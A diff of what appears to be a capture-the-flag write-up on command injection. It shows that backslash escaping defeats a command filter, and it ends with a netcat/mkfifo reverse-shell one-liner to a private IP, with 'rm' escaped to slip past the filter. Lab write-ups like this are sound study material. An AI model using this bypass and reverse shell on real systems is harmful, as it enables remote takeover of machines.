@@ -75,6 +75,10 @@ Apaar
 ---
 Now lets try command Injection :
 
-
+If we try ls it filters the command
 ![[Pasted image 20260209225117.png]]
+
+But if we use `\` with command `l\s` then it doesn't filters it.
+
+
 r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.209.139 8888 >/tmp/f
